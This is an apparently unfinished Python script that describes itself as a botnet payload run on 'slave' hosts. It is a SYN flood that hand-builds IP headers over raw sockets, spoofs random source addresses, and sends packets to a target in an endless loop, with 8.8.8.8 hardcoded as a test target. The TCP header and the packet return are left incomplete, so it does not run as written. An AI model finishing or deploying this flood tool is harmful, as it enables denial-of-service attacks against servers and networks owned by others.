#!/usr/bin/python3
'''
This payload is supposed to be executed on "slave" hosts.

Simple SYN flood script, using only packages from python standard library.
Doing it with scapy would be easier but the target bots would need to have the package installed.
'''

import sys
import socket
import random
import struct

# Temporary to debug
import binascii


# Generates an IP address in the format "x.x.x.x" with x a random number between 0 and 255
def generate_random_ip() -> str:
  return ".".join([str(random.randint(0, 255)) for _ in range(4)])


def calculate_checksum(message: bytes) -> int:
    # Split the message into 16-bit words
    words = [message[i:i+2] for i in range(0, len(message), 2)]

    # Convert each word to an integer (network byte order is big endian)
    words = [int.from_bytes(word, 'big') for word in words]

    # Calculate the sum of all words
    sum_words = sum(words)

    # Add any carry bits to the sum
    while sum_words >> 16:
        sum_words = (sum_words & 0xFFFF) + (sum_words >> 16)

    # Take the one's complement of the sum
    checksum = ~sum_words & 0xFFFF

    return checksum


def TCP_SYN(target_ip, target_port, src_ip):
    # Creating the IP header first
    version = 4                                 # 4 bits
    IHL = 5                                     # 4 bits
    vers_ihl = (version << 4) + IHL             # 1 octet
    service = 0                                 # 1 octet
    total_len = 20 + 20                         # 2 octets (IP header length + TCP header length)
    id = random.randint(1,65535)                # 2 octets
    flags_offset = 0                            # 2 octets
    ttl = random.randint(10, 255)               # 1 octet
    proto = socket.IPPROTO_TCP                  # 1 octet
    checksum = 0                                # 2 octets
    src_addr = socket.inet_aton(src_ip)         # 4 octets
    dst_addr = socket.inet_aton(target_ip)      # 4 octets

    ip_head_no_check = struct.pack('!BBHHHBBH4s4s', vers_ihl, service, total_len, id, flags_offset, ttl, proto, checksum, src_addr, dst_addr)
    checksum = calculate_checksum(ip_head_no_check)

    IP_HEADER = struct.pack('!BBHHHBBH4s4s', vers_ihl, service, total_len, id, flags_offset, ttl, proto, checksum, src_addr, dst_addr)
    print('IP_HEADER:\n\t', binascii.hexlify(IP_HEADER))

    # Creating the TCP header


    # Returning the entire packet
    #return packet


# Main function
def main():
    # Would not use interactive session when executing payload on bot: JUST FOR TESTING
    target_ip = '8.8.8.8'
    target_port = 80

    # Testing section (to remove)
    TCP_SYN(target_ip, target_port, '127.0.0.1')
    sys.exit()
    
    # Try to create a TCP socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error as msg:
        print ('Socket could not be created. Error Code : ' + str(msg[0]) +' Message ' + msg[1])
        sys.exit()
    
    # Set the socket option "IP Header Include" to True
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while True:
        src_ip = generate_random_ip()
        packet = TCP_SYN(target_ip, target_port, src_ip)

        # Send the packet
        s.sendto(packet, (target_ip, target_port))
    

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        raise SystemExit("Ctrl+C pressed. Exiting.")
